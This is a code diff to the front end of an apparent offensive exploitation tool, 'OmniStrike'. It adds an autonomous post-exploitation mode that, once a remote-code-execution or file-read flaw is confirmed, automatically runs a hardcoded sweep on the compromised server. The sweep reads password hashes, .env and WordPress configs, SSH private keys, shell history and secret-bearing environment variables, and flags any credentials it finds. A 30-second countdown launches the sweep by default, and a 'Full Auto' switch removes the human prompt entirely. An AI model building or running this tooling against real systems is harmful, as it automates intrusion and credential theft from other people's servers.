@@ -6,11 +6,14 @@ import { Badge } from "@/components/ui/badge";
 import {
   Zap, Square, Trash2, ChevronDown, ChevronUp, Download,
   ShieldAlert, AlertTriangle, Info, RefreshCw, Copy, Terminal,
-  Folder, File, FolderOpen, ChevronRight, Home, ArrowLeft,
-  Mouse, Lock, Unlock, Search, PlayCircle, Layers, Settings2,
-  ChevronUp as Up, ChevronDown as Dn, CheckCircle2, Clock, Circle,
+  Folder, File, FolderOpen, Home, ArrowLeft,
+  Mouse, Lock, Unlock, Search, Layers, Settings2,
+  ChevronUp as Up, ChevronDown as Dn, CheckCircle2, Circle,
   SkipForward, ListOrdered, Swords, Crosshair,
+  Bot, UserCheck, Pause, Play, AlertOctagon, Radio,
 } from "lucide-react";
+
+const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms));
 
 const API = "/api/omnistrike";
 
@@ -98,6 +101,54 @@ const PHASE_BADGE_COLORS: Record<string, string> = {
   orange: "bg-orange-900 text-orange-200", red: "bg-red-900 text-red-200",
   purple: "bg-purple-900 text-purple-200", pink: "bg-pink-900 text-pink-200",
 };
+
+type AutonomousEntry = {
+  cmd: string;
+  output: string;
+  ts: string;
+  kind: "cmd" | "file" | "info" | "breach";
+};
+
+const AUTO_RECON_RCE = [
+  { cmd: "id && whoami",                                                                           label: "Identity & UID" },
+  { cmd: "uname -a",                                                                               label: "Kernel version" },
+  { cmd: "hostname && cat /etc/os-release 2>/dev/null | head -5",                                 label: "OS fingerprint" },
+  { cmd: "cat /etc/passwd | head -30",                                                             label: "User accounts" },
+  { cmd: "cat /etc/shadow 2>/dev/null | head -10",                                                 label: "Password hashes" },
+  { cmd: "env | grep -iE 'key|secret|pass|token|db|api|aws|mysql|mongo|redis' 2>/dev/null",       label: "Sensitive env vars" },
+  { cmd: "cat /var/www/html/.env 2>/dev/null || cat /app/.env 2>/dev/null || cat ~/.env 2>/dev/null", label: ".env credentials" },
+  { cmd: "cat /var/www/html/config.php 2>/dev/null || cat /var/www/html/wp-config.php 2>/dev/null",   label: "Web app credentials" },
+  { cmd: "find /var/www /opt /app -name '*.env' -o -name 'database.yml' -o -name 'secrets.yml' 2>/dev/null | head -10", label: "Config file sweep" },
+  { cmd: "ls -la ~/.ssh/ 2>/dev/null",                                                             label: "SSH directory" },
+  { cmd: "cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null",                    label: "SSH private key" },
+  { cmd: "cat ~/.bash_history 2>/dev/null | tail -30",                                             label: "Command history" },
+  { cmd: "ps aux | head -25",                                                                      label: "Running processes" },
+  { cmd: "netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null",                                     label: "Open ports" },
+  { cmd: "cat /etc/hosts",                                                                         label: "Internal network map" },
+  { cmd: "ip addr 2>/dev/null || ifconfig 2>/dev/null | head -30",                                 label: "Network interfaces" },
+  { cmd: "find / -perm -4000 -type f -maxdepth 6 2>/dev/null | head -15",                         label: "SUID binaries (privesc)" },
+  { cmd: "cat /etc/crontab 2>/dev/null && ls /etc/cron.d/ 2>/dev/null",                           label: "Scheduled tasks" },
+  { cmd: "ls -la /var/backups/ 2>/dev/null && ls -la /backup/ 2>/dev/null",                       label: "Backup directories" },
+  { cmd: "find / -name '*.pem' -o -name '*.key' -o -name '*.crt' 2>/dev/null | head -10",         label: "SSL/TLS certificates" },
+];
+
+const AUTO_RECON_LFI = [
+  { path: "/etc/passwd",                                           label: "User accounts" },
+  { path: "/etc/shadow",                                           label: "Password hashes" },
+  { path: "/etc/hosts",                                            label: "Internal network" },
+  { path: "/proc/version",                                         label: "Kernel info" },
+  { path: "/proc/self/environ",                                    label: "Process env vars" },
+  { path: "/var/www/html/.env",                                    label: "App credentials" },
+  { path: "/var/www/html/wp-config.php",                           label: "WordPress credentials" },
+  { path: "/var/www/html/config.php",                              label: "App config" },
+  { path: "/home/ubuntu/.bash_history",                            label: "Command history" },
+  { path: "/home/ubuntu/.ssh/id_rsa",                              label: "SSH private key" },
+  { path: "/home/www-data/.bash_history",                          label: "www-data history" },
+  { path: "/etc/apache2/sites-enabled/000-default.conf",           label: "Apache config" },
+  { path: "/etc/nginx/sites-enabled/default",                      label: "Nginx config" },
+  { path: "/etc/mysql/my.cnf",                                     label: "MySQL credentials" },
+  { path: "/var/log/auth.log",                                     label: "Auth log" },
+];
 
 type Finding = {
   category: string; technique: string; payload: string; url: string;
@@ -473,6 +524,207 @@ function ExploitDesktop({ scanId, session }: { scanId: number; session: ExploitS
   );
 }
 
+// ── Breach Alert Overlay ─────────────────────────────────────────────────────
+function BreachAlertOverlay({
+  session, countdown, onManual, onAutonomous,
+}: {
+  session: ExploitSession;
+  countdown: number;
+  onManual: () => void;
+  onAutonomous: () => void;
+}) {
+  const pct = Math.max(0, (countdown / 30) * 100);
+  const urgent = countdown <= 10;
+  return (
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85">
+      <div className={`absolute inset-0 border-4 pointer-events-none transition-colors ${urgent ? "border-red-500 animate-pulse" : "border-red-800"}`} />
+      <div className="bg-gray-950 border-2 border-red-600 rounded-2xl max-w-lg w-full shadow-2xl shadow-red-900/50 overflow-hidden">
+
+        {/* Header */}
+        <div className="bg-red-900/70 border-b border-red-700 px-6 py-5 text-center">
+          <div className="flex items-center justify-center gap-3 mb-2">
+            <AlertOctagon className="h-7 w-7 text-red-400 animate-pulse shrink-0" />
+            <span className="text-xl font-black text-red-200 tracking-widest">SYSTEM BREACH CONFIRMED</span>
+            <AlertOctagon className="h-7 w-7 text-red-400 animate-pulse shrink-0" />
+          </div>
+          <p className="text-red-400 text-xs font-mono truncate">{session.target}</p>
+        </div>
+
+        {/* Session info grid */}
+        <div className="px-6 pt-5 pb-3">
+          <div className="grid grid-cols-2 gap-2 mb-4 text-xs font-mono">
+            {[
+              { k: "USER",    v: `${session.user}@${session.hostname}`, color: "text-green-400" },
+              { k: "VECTOR",  v: session.technique,                     color: "text-red-400" },
+              { k: "OS",      v: session.os || "Linux",                 color: "text-cyan-400" },
+              { k: "PARAM",   v: `?${session.param}`,                   color: "text-yellow-400" },
+            ].map(({ k, v, color }) => (
+              <div key={k} className="bg-gray-900 border border-gray-800 rounded-lg p-2.5">
+                <div className="text-gray-600 mb-0.5 text-[10px]">{k}</div>
+                <div className={`font-bold truncate ${color}`}>{v}</div>
+              </div>
+            ))}
+          </div>
+
+          {/* Countdown bar */}
+          <div className="mb-5">
+            <div className="flex items-center justify-between mb-1.5">
+              <span className="text-xs text-gray-400">Auto-continuing to autonomous in</span>
+              <span className={`text-xl font-black font-mono tabular-nums ${urgent ? "text-red-400 animate-pulse" : "text-amber-400"}`}>
+                {countdown}s
+              </span>
+            </div>
+            <div className="w-full bg-gray-800 rounded-full h-2.5 overflow-hidden">
+              <div
+                className="h-2.5 rounded-full bg-gradient-to-r from-amber-500 to-red-500 transition-all duration-1000"
+                style={{ width: `${pct}%` }}
+              />
+            </div>
+          </div>
+
+          {/* Choice buttons */}
+          <div className="grid grid-cols-2 gap-3 mb-5">
+            <button onClick={onManual}
+              className="flex flex-col items-center gap-2 bg-blue-950/60 border border-blue-700 rounded-xl p-4 hover:bg-blue-900/60 transition-all group active:scale-95">
+              <UserCheck className="h-9 w-9 text-blue-400 group-hover:text-blue-300 transition-colors" />
+              <span className="text-sm font-black text-blue-300">TAKE CONTROL</span>
+              <span className="text-[10px] text-blue-600 text-center leading-tight">Manual console — you drive every command</span>
+            </button>
+            <button onClick={onAutonomous}
+              className="flex flex-col items-center gap-2 bg-red-950/60 border border-red-700 rounded-xl p-4 hover:bg-red-900/60 transition-all group active:scale-95">
+              <Bot className="h-9 w-9 text-red-400 group-hover:text-red-300 animate-pulse" />
+              <span className="text-sm font-black text-red-300">GO AUTONOMOUS</span>
+              <span className="text-[10px] text-red-600 text-center leading-tight">System harvests credentials automatically</span>
+            </button>
+          </div>
+
+          <p className="text-[10px] text-gray-600 text-center">
+            You can take control at any time after choosing autonomous — the operator stays live
+          </p>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ── Autonomous Console ────────────────────────────────────────────────────────
+function AutonomousConsole({
+  session, log, running, paused, onTakeControl, onTogglePause,
+}: {
+  session: ExploitSession;
+  log: AutonomousEntry[];
+  running: boolean;
+  paused: boolean;
+  onTakeControl: () => void;
+  onTogglePause: () => void;
+}) {
+  const termRef = useRef<HTMLDivElement>(null);
+  useEffect(() => {
+    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
+  }, [log]);
+
+  const findings = log.filter(e => e.kind === "breach");
+  const cmdsRun  = log.filter(e => e.kind === "cmd").length;
+
+  return (
+    <div className="bg-gray-950 border-2 border-amber-700 rounded-lg overflow-hidden shadow-xl shadow-amber-900/20">
+      {/* Title bar */}
+      <div className="bg-amber-900/50 border-b border-amber-800 px-4 py-2.5 flex items-center gap-3">
+        <Bot className={`h-5 w-5 ${running && !paused ? "text-amber-400 animate-pulse" : "text-amber-600"}`} />
+        <span className="text-amber-300 font-black text-sm font-mono tracking-wider">AUTONOMOUS OPERATOR</span>
+        {running && !paused && (
+          <span className="flex items-center gap-1.5 text-amber-400 text-xs font-mono">
+            <Radio className="h-3 w-3 animate-pulse" /> LIVE
+          </span>
+        )}
+        {paused && <span className="text-yellow-400 text-xs font-mono">⏸ PAUSED</span>}
+        {!running && <span className="text-green-400 text-xs font-mono">✓ SWEEP COMPLETE</span>}
+
+        <div className="ml-auto flex items-center gap-2">
+          {/* Findings badge */}
+          {findings.length > 0 && (
+            <span className="bg-red-900 border border-red-700 text-red-300 text-[10px] font-bold px-2 py-0.5 rounded-full">
+              {findings.length} critical findings
+            </span>
+          )}
+          {(running || paused) && (
+            <button onClick={onTogglePause}
+              className="flex items-center gap-1.5 px-3 py-1 rounded-lg text-xs font-bold border border-yellow-700 text-yellow-300 hover:bg-yellow-900/40 transition-colors">
+              {paused ? <><Play className="h-3 w-3" /> Resume</> : <><Pause className="h-3 w-3" /> Pause</>}
+            </button>
+          )}
+          <button onClick={onTakeControl}
+            className="flex items-center gap-1.5 px-4 py-1.5 rounded-lg text-xs font-black bg-red-700 hover:bg-red-600 text-white transition-colors shadow-lg shadow-red-900/40 active:scale-95">
+            <UserCheck className="h-3.5 w-3.5" /> TAKE CONTROL
+          </button>
+        </div>
+      </div>
+
+      {/* Session info */}
+      <div className="bg-gray-900 px-4 py-1.5 flex flex-wrap gap-4 text-[11px] font-mono border-b border-gray-800">
+        <span className="text-amber-400">auto@{session.hostname}</span>
+        <span className="text-gray-500">target: <span className="text-gray-300">{session.target}</span></span>
+        <span className="text-gray-500">mode: <span className="text-red-400">{session.vector.toUpperCase()}</span></span>
+        <span className="text-gray-500 ml-auto">{cmdsRun} commands executed</span>
+      </div>
+
+      {/* Terminal output */}
+      <div ref={termRef} className="bg-black p-4 font-mono text-xs max-h-[520px] min-h-[280px] overflow-auto">
+        {/* Banner */}
+        <div className="text-amber-600/80 mb-4 leading-relaxed">
+          {`╔══════════════════════════════════════════════════════╗`}<br />
+          {`║    OmniStrike Autonomous Post-Exploitation Engine    ║`}<br />
+          {`║    Target: ${session.target.substring(0,41).padEnd(41)} ║`}<br />
+          {`╚══════════════════════════════════════════════════════╝`}
+        </div>
+
+        {log.map((entry, i) => (
+          <div key={i} className="mb-3">
+            {entry.kind === "info" ? (
+              <div className="text-amber-700 border-t border-gray-900 pt-2 mt-2 text-[10px]">{entry.cmd}</div>
+            ) : entry.kind === "breach" ? (
+              <div className="flex items-start gap-2 bg-red-950/50 border border-red-800 rounded px-2.5 py-1.5 text-red-300">
+                <AlertOctagon className="h-3.5 w-3.5 shrink-0 mt-0.5 text-red-400" />
+                <span>{entry.cmd}</span>
+              </div>
+            ) : (
+              <>
+                <div>
+                  <span className="text-gray-600">[{entry.ts}] </span>
+                  <span className="text-amber-500">auto$ </span>
+                  <span className="text-white">{entry.cmd}</span>
+                </div>
+                {entry.output && (
+                  <pre className="text-green-300 whitespace-pre-wrap pl-4 mt-0.5 break-all text-[11px] leading-relaxed">
+                    {entry.output.substring(0, 1000)}{entry.output.length > 1000 ? "\n...(truncated)" : ""}
+                  </pre>
+                )}
+              </>
+            )}
+          </div>
+        ))}
+
+        {running && !paused && (
+          <div className="flex items-center gap-2 text-amber-400">
+            <RefreshCw className="h-3 w-3 animate-spin shrink-0" />
+            <span>Executing next stage...</span>
+          </div>
+        )}
+        {paused && (
+          <div className="text-yellow-500 mt-2">
+            ⏸ Paused — click Resume to continue or Take Control to switch to manual
+          </div>
+        )}
+        {!running && log.length > 0 && (
+          <div className="text-green-400 border-t border-gray-800 pt-3 mt-3">
+            ✓ Autonomous sweep complete — {cmdsRun} commands · {findings.length} critical findings
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
 // ── Helper: poll a scan until it completes ───────────────────────────────────
 async function pollUntilDone(
   scanId: number,
@@ -500,6 +752,19 @@ export default function OmniStrike() {
   const [target, setTarget] = useState("");
   const [tamperLevel, setTamperLevel] = useState(4);
   const [stealthMode, setStealthMode] = useState(false);
+  const [fullAuto, setFullAuto] = useState(false);
+
+  // ── Breach / autonomous state ────────────────────────────────────────────
+  const [breachState, setBreachState] = useState<"idle"|"alert"|"manual"|"autonomous">("idle");
+  const [breachSession, setBreachSession] = useState<ExploitSession | null>(null);
+  const [countdown, setCountdown] = useState(30);
+  const [autonomousLog, setAutonomousLog] = useState<AutonomousEntry[]>([]);
+  const [autonomousRunning, setAutonomousRunning] = useState(false);
+  const [autonomousPaused, setAutonomousPaused] = useState(false);
+  const autonomousPausedRef = useRef(false);
+  const autoAbortRef = useRef(false);
+  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const breachFiredRef = useRef(false);
 
   // Orchestrator mode
   const [orchMode, setOrchMode] = useState<"salvo" | "chain" | "custom">("chain");
@@ -550,10 +815,143 @@ export default function OmniStrike() {
         const r = await fetch(`${API}/scan/${id}`);
         const scan = await r.json();
         setActiveScan(scan);
-        if (scan.session) setSessionData(scan.session);
+        if (scan.session) {
+          setSessionData(scan.session);
+          triggerBreach(scan.session);
+        }
         if (scan.status !== "running") { clearInterval(pollRef.current!); pollRef.current = null; loadScans(); }
       } catch {}
     }, 1500);
+  };
+
+  // ── Breach detection & autonomous control ────────────────────────────────
+  const triggerBreach = useCallback((sess: ExploitSession) => {
+    if (breachFiredRef.current) return;
+    breachFiredRef.current = true;
+    setBreachSession(sess);
+    setSessionData(sess);
+    if (fullAuto) {
+      setBreachState("autonomous");
+      runAutonomous(sess);
+    } else {
+      setBreachState("alert");
+      setCountdown(30);
+      if (countdownRef.current) clearInterval(countdownRef.current);
+      countdownRef.current = setInterval(() => {
+        setCountdown(prev => {
+          if (prev <= 1) {
+            clearInterval(countdownRef.current!);
+            countdownRef.current = null;
+            setBreachState("autonomous");
+            runAutonomous(sess);
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+    }
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [fullAuto]);
+
+  const chooseManual = () => {
+    if (countdownRef.current) { clearInterval(countdownRef.current); countdownRef.current = null; }
+    autoAbortRef.current = true;
+    setBreachState("manual");
+    setShowDesktop(true);
+  };
+
+  const chooseAutonomous = () => {
+    if (countdownRef.current) { clearInterval(countdownRef.current); countdownRef.current = null; }
+    setBreachState("autonomous");
+    if (breachSession) runAutonomous(breachSession);
+  };
+
+  const takeControlFromAuto = () => {
+    autoAbortRef.current = true;
+    setAutonomousRunning(false);
+    setBreachState("manual");
+    setShowDesktop(true);
+  };
+
+  const toggleAutoPause = () => {
+    setAutonomousPaused(prev => {
+      const next = !prev;
+      autonomousPausedRef.current = next;
+      return next;
+    });
+  };
+
+  const resetBreach = () => {
+    if (countdownRef.current) { clearInterval(countdownRef.current); countdownRef.current = null; }
+    autoAbortRef.current = true;
+    autonomousPausedRef.current = false;
+    breachFiredRef.current = false;
+    setBreachState("idle");
+    setBreachSession(null);
+    setAutonomousLog([]);
+    setAutonomousRunning(false);
+    setAutonomousPaused(false);
+  };
+
+  const runAutonomous = async (sess: ExploitSession) => {
+    autoAbortRef.current = false;
+    autonomousPausedRef.current = false;
+    setAutonomousPaused(false);
+    setAutonomousLog([]);
+    setAutonomousRunning(true);
+    const ts = () => new Date().toLocaleTimeString();
+    const addEntry = (entry: AutonomousEntry) => setAutonomousLog(prev => [...prev, entry]);
+    const isRce = sess.vector === "rce";
+    const scanId = sess.scanId;
+
+    const flagFindings = (output: string) => {
+      if (output.match(/root:[x*]:0:0/)) addEntry({ cmd: "🔴 CRITICAL: Root account found in /etc/passwd", output: "", ts: ts(), kind: "breach" });
+      if (output.match(/\$[126y]\$|\$2[aby]\$/)) addEntry({ cmd: "🔴 CRITICAL: Password hashes extracted — brute-force offline", output: "", ts: ts(), kind: "breach" });
+      if (output.match(/\b(password|passwd|secret|api_key|token|db_pass)\s*[=:]\s*\S+/i)) addEntry({ cmd: "🔴 CRITICAL: Credential found in plaintext", output: "", ts: ts(), kind: "breach" });
+      if (output.includes("BEGIN RSA PRIVATE KEY") || output.includes("BEGIN OPENSSH PRIVATE KEY") || output.includes("BEGIN EC PRIVATE KEY")) addEntry({ cmd: "🔴 CRITICAL: SSH private key extracted — full auth bypass possible", output: "", ts: ts(), kind: "breach" });
+      if (output.match(/aws_access_key_id|AKIA[A-Z0-9]{16}/i)) addEntry({ cmd: "🔴 CRITICAL: AWS credentials found", output: "", ts: ts(), kind: "breach" });
+    };
+
+    if (isRce) {
+      for (const step of AUTO_RECON_RCE) {
+        if (autoAbortRef.current) break;
+        while (autonomousPausedRef.current && !autoAbortRef.current) await sleep(400);
+        if (autoAbortRef.current) break;
+        try {
+          const r = await fetch(`${API}/console/${scanId}/exec`, {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ command: step.cmd }),
+          });
+          const d = await r.json();
+          const output: string = d.output ?? "(no output)";
+          addEntry({ cmd: step.cmd, output, ts: ts(), kind: "cmd" });
+          flagFindings(output);
+          await sleep(700);
+        } catch { addEntry({ cmd: step.cmd, output: "(connection error)", ts: ts(), kind: "cmd" }); }
+      }
+    } else {
+      for (const step of AUTO_RECON_LFI) {
+        if (autoAbortRef.current) break;
+        while (autonomousPausedRef.current && !autoAbortRef.current) await sleep(400);
+        if (autoAbortRef.current) break;
+        try {
+          const r = await fetch(`${API}/console/${scanId}/read`, {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ filePath: step.path }),
+          });
+          const d = await r.json();
+          const output: string = d.content ?? "(not readable)";
+          addEntry({ cmd: `cat ${step.path}  # ${step.label}`, output, ts: ts(), kind: "cmd" });
+          flagFindings(output);
+          await sleep(600);
+        } catch { addEntry({ cmd: `cat ${step.path}`, output: "(error)", ts: ts(), kind: "cmd" }); }
+      }
+    }
+
+    if (!autoAbortRef.current) {
+      setAutonomousRunning(false);
+      toast({ title: "Autonomous sweep complete", description: `${isRce ? AUTO_RECON_RCE.length : AUTO_RECON_LFI.length} commands executed` });
+    }
   };
 
   // ── SALVO / CUSTOM: single scan ──────────────────────────────────────────
@@ -567,7 +965,7 @@ export default function OmniStrike() {
         method: "POST", headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ target: url, categories: cats, tamperLevel, stealthMode }),
       });
-      if (!r.ok) { const e = await r.json(); return toast({ title: "Launch failed", description: e.error, variant: "destructive" }); }
+      if (!r.ok) { const e = await r.json(); toast({ title: "Launch failed", description: e.error, variant: "destructive" }); return; }
       const { scanId } = await r.json();
       const sr = await fetch(`${API}/scan/${scanId}`);
       const scan = await sr.json();
@@ -649,10 +1047,10 @@ export default function OmniStrike() {
           idx === i ? { ...p, status: "done", scanId, scan: completedScan, findings: (completedScan.findings ?? []).length, confirmed } : p
         ));
 
-        // If we found an RCE/LFI in this phase, open the console automatically
+        // If we found an RCE/LFI in this phase, trigger the breach handler
         if (completedScan.session) {
           setSessionData(completedScan.session);
-          setShowDesktop(true);
+          triggerBreach(completedScan.session);
         }
 
       } catch (e: any) {
@@ -679,6 +1077,7 @@ export default function OmniStrike() {
 
   // ── Main launch dispatcher ───────────────────────────────────────────────
   const launch = () => {
+    resetBreach();
     if (orchMode === "salvo") launchSingleScan(salvoCategories);
     else if (orchMode === "custom") launchSingleScan(customModules.filter(m => m.enabled).map(m => m.id));
     else launchChain();
@@ -792,6 +1191,16 @@ export default function OmniStrike() {
 
   return (
     <div className="min-h-screen bg-[#0a0a0f] text-gray-100 p-4 md:p-6">
+      {/* ── Breach Alert Overlay (portal to viewport) ────────────── */}
+      {breachState === "alert" && breachSession && (
+        <BreachAlertOverlay
+          session={breachSession}
+          countdown={countdown}
+          onManual={chooseManual}
+          onAutonomous={chooseAutonomous}
+        />
+      )}
+
       {/* Header */}
       <div className="mb-6">
         <div className="flex flex-wrap items-center gap-3 mb-1">
@@ -868,6 +1277,31 @@ export default function OmniStrike() {
                   </div>
                   <span className="text-sm text-gray-300">Stealth Mode</span>
                 </label>
+
+                {/* Divider */}
+                <div className="border-t border-gray-800 pt-3 mt-1">
+                  <div className="flex items-center gap-2 mb-1.5">
+                    <Bot className="h-3.5 w-3.5 text-amber-400" />
+                    <span className="text-xs font-semibold text-gray-300 uppercase tracking-wider">Autonomous Mode</span>
+                  </div>
+                  <label className="flex items-center gap-3 cursor-pointer mb-2">
+                    <div className={`w-10 h-5 rounded-full transition-colors relative ${fullAuto ? "bg-amber-600" : "bg-gray-700"}`}
+                      onClick={() => setFullAuto(p => !p)}>
+                      <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-all ${fullAuto ? "left-5" : "left-0.5"}`} />
+                    </div>
+                    <div>
+                      <span className="text-sm text-gray-300">Full Auto</span>
+                      <p className="text-[10px] text-gray-600 leading-tight mt-0.5">
+                        Skip the 30s prompt — instantly run autonomous operator on breach
+                      </p>
+                    </div>
+                  </label>
+                  {!fullAuto && (
+                    <p className="text-[10px] text-gray-600 leading-tight">
+                      Off: breach alert with 30s timer to choose manual or autonomous
+                    </p>
+                  )}
+                </div>
               </div>
 
               {/* ── ATTACK ORCHESTRATOR ────────────────────────────────── */}
@@ -1223,13 +1657,39 @@ export default function OmniStrike() {
             </div>
           </div>
 
-          {/* Post-Exploitation Desktop */}
-          {showDesktop && sessionData && displayScan && (
+          {/* ── Post-Exploitation: autonomous console ───────────────── */}
+          {breachState === "autonomous" && breachSession && (
             <div>
-              <h2 className="text-lg font-bold text-red-400 mb-3 flex items-center gap-2">
-                <Terminal className="h-5 w-5" /> Post-Exploitation Console
-                <span className="text-sm text-gray-400 font-normal ml-2">— Live access via confirmed exploit</span>
+              <h2 className="text-lg font-bold text-amber-400 mb-3 flex items-center gap-2">
+                <Bot className="h-5 w-5 animate-pulse" /> Autonomous Post-Exploitation Operator
+                <span className="text-sm text-gray-400 font-normal ml-2">— credential sweep in progress</span>
               </h2>
+              <AutonomousConsole
+                session={breachSession}
+                log={autonomousLog}
+                running={autonomousRunning}
+                paused={autonomousPaused}
+                onTakeControl={takeControlFromAuto}
+                onTogglePause={toggleAutoPause}
+              />
+            </div>
+          )}
+
+          {/* ── Post-Exploitation: manual console ───────────────────── */}
+          {(breachState === "manual" || (showDesktop && breachState === "idle")) && sessionData && displayScan && (
+            <div>
+              <div className="flex items-center gap-3 mb-3">
+                <h2 className="text-lg font-bold text-red-400 flex items-center gap-2">
+                  <Terminal className="h-5 w-5" /> Post-Exploitation Console
+                  <span className="text-sm text-gray-400 font-normal ml-2">— Live access via confirmed exploit</span>
+                </h2>
+                {breachState === "manual" && (
+                  <button onClick={() => { setBreachState("autonomous"); if (breachSession) runAutonomous(breachSession); }}
+                    className="ml-auto flex items-center gap-1.5 px-3 py-1 rounded-lg text-xs font-bold border border-amber-700 text-amber-400 hover:bg-amber-900/30 transition-colors">
+                    <Bot className="h-3.5 w-3.5" /> Switch to Autonomous
+                  </button>
+                )}
+              </div>
               <ExploitDesktop scanId={displayScan.id} session={sessionData} />
             </div>
           )}
